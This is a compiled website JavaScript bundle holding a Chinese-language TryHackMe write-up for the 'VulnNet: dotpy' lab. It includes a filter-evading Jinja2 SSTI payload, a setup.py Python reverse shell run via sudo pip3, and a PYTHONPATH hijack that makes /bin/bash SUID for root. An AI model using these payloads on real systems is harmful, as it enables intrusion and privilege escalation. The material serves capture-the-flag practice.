"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[4834],{26974:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>o,default:()=>m,frontMatter:()=>a,metadata:()=>r,toc:()=>p});var s=n(74848),i=n(28453);const a={sidebar_position:135,tags:["Easy","Linux","SSTI","SUDO"],title:"VulnNet: dotpy",description:"VulnNet: dotpy",sidebar_label:"VulnNet: dotpy",slug:"/tryhackme/135"},o="VulnNet: dotpy",r={id:"box/TryHackMe/135",title:"VulnNet: dotpy",description:"VulnNet: dotpy",source:"@site/docs/box/TryHackMe/135.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/135",permalink:"/docs/tryhackme/135",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"SSTI",permalink:"/docs/tags/ssti"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:135,frontMatter:{sidebar_position:135,tags:["Easy","Linux","SSTI","SUDO"],title:"VulnNet: dotpy",description:"VulnNet: dotpy",sidebar_label:"VulnNet: dotpy",slug:"/tryhackme/135"},sidebar:"boxSidebar",previous:{title:"Lunizz CTF",permalink:"/docs/tryhackme/134"},next:{title:"broker",permalink:"/docs/tryhackme/136"}},l={},p=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"8080",id:"8080",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"web",id:"web",level:3},{value:"web \u2014&gt; system-adm",id:"web--system-adm",level:3},{value:"system-adm \u2014&gt; root",id:"system-adm--root",level:3}];function d(e){const t={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(t.h1,{id:"vulnnet-dotpy",children:"VulnNet: dotpy"}),"\n",(0,s.jsx)(t.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-239-79:~/vulnnetdotpy# nmap -sTCV -p- --min-rate 1000 10.10.78.187\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-03 11:51 BST\nNmap scan report for ip-10-10-78-187.eu-west-1.compute.internal (10.10.78.187)\nHost is up (0.00034s latency).\nNot shown: 65534 closed ports\nPORT     STATE SERVICE VERSION\n8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)\n| http-title: VulnNet Entertainment -  Login  | Discover\n|_Requested resource was http://ip-10-10-78-187.eu-west-1.compute.internal:8080/login\nMAC Address: 02:A0:03:86:07:81 (Unknown)\n"})}),"\n",(0,s.jsx)(t.h2,{id:"8080",children:"8080"}),"\n",(0,s.jsx)(t.p,{children:"\u8bbf\u95ee\u6b64\u7ad9\u70b9\u8fdb\u884c\u76ee\u5f55\u904d\u5386\u4e5f\u6ca1\u6709\u53d1\u73b0\u4efb\u4f55\u65b0\u7684\u9875\u9762, \u63a5\u7740\u6211\u8bbf\u95ee\u9875\u9762\u5e76\u521b\u5efa\u8d26\u53f7\u8fdb\u884c\u767b\u9646, \u5728\u5176\u4e2d\u6211\u53d1\u73b0\u4e00\u4e2a\u9875\u9762\u5b58\u5728 SSTI \u6f0f\u6d1e"}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-161957.png",alt:"image-20240709161956660"})}),"\n",(0,s.jsx)(t.p,{children:"\u56e0\u6b64\u6211\u4fbf\u5f00\u59cb\u4e86\u4e00\u7cfb\u5217\u7684\u653b\u51fb\u4f46\u662f\u6211\u53d1\u73b0\u4ed6\u8fc7\u6ee4\u4e86\u4e00\u4e9b\u5185\u5bb9, \u6240\u4ee5\u6211\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u5c1d\u8bd5\u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u8fc7\u6ee4\u4e86 : > _ [] ."}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-162009.png",alt:"image-20240709162008660"})}),"\n",(0,s.jsx)(t.p,{children:"\u67e5\u627e\u4e86\u4e00\u4e9b payload \u540e\u6211\u53d1\u73b0\u4e86\u4e00\u4e2a"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}\n"})}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-162018.png",alt:"image-20240709162017285"})}),"\n",(0,s.jsx)(t.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(t.h3,{id:"web",children:"web"}),"\n",(0,s.jsx)(t.p,{children:"\u5229\u7528\u4e0a\u9762\u5f97\u5230\u7684 payload \u8fdb\u884c\u64cd\u4f5c\u83b7\u53d6\u4e00\u4e2a Shell"}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-162035.png",alt:"image-20240709162034015"})}),"\n",(0,s.jsx)(t.h3,{id:"web--system-adm",children:"web \u2014> system-adm"}),"\n",(0,s.jsx)(t.p,{children:"\u53d1\u73b0\u7528\u6237\u53ef\u4ee5\u4ee5 system-adm \u8eab\u4efd\u6267\u884c pip \u547d\u4ee4, \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u5b8c\u6210\u653b\u51fb"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:'(remote) web@vulnnet-dotpy:/home/web/shuriken-dotpy$ sudo -l\nMatching Defaults entries for web on vulnnet-dotpy:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser web may run the following commands on vulnnet-dotpy:\n    (system-adm) NOPASSWD: /usr/bin/pip3 install *\n\n(remote) web@vulnnet-dotpy:/tmp$ cat << EOF > setup.py\n> import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.239.79",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\n> EOF\n(remote) web@vulnnet-dotpy:/tmp$ sudo -u system-adm /usr/bin/pip3 install /tmp\nProcessing /tmp\n'})}),"\n",(0,s.jsx)(t.p,{children:"\u4e4b\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a Shell"}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-162044.png",alt:"image-20240709162042994"})}),"\n",(0,s.jsx)(t.h3,{id:"system-adm--root",children:"system-adm \u2014> root"}),"\n",(0,s.jsx)(t.p,{children:"\u63a5\u7740\u53d1\u73b0\u7528\u6237 system-adm \u53ef\u4ee5\u6267\u884c SUDO \u7279\u6743\u53bb\u6267\u884c\u4e00\u4e2a Python \u811a\u672c\u540c\u65f6\u5e26\u6709 SETENV \u7279\u6743, \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528 Python  \u7684 PATH \u63d0\u6743"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"(remote) system-adm@vulnnet-dotpy:/home/system-adm$ sudo -l\nMatching Defaults entries for system-adm on vulnnet-dotpy:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser system-adm may run the following commands on vulnnet-dotpy:\n    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py\n(remote) system-adm@vulnnet-dotpy:/opt$ cat backup.py  | head -n 3\nfrom datetime import datetime\nfrom pathlib import Path\nimport zipfile\n(remote) system-adm@vulnnet-dotpy:/tmp$ cat << EOF >zipfile.py\n> import os\n> os.system('chmod u+s /bin/bash')\n> EOF\n(remote) system-adm@vulnnet-dotpy:/tmp$ sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/backup.py\nTraceback (most recent call last):\n  File \"/opt/backup.py\", line 32, in <module>\n    zip_file = zipfile.ZipFile(str(backup_directory_path / backup_file_name), mode='w')\nAttributeError: module 'zipfile' has no attribute 'ZipFile'\n(remote) system-adm@vulnnet-dotpy:/tmp$ ls -al /bin/bash\n-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash\n"})})]})}function m(e={}){const{wrapper:t}={...(0,i.R)(),...e.components};return t?(0,s.jsx)(t,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},28453:(e,t,n)=>{n.d(t,{R:()=>o,x:()=>r});var s=n(96540);const i={},a=s.createContext(i);function o(e){const t=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function r(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:o(e.components),s.createElement(a.Provider,{value:t},e.children)}}}]);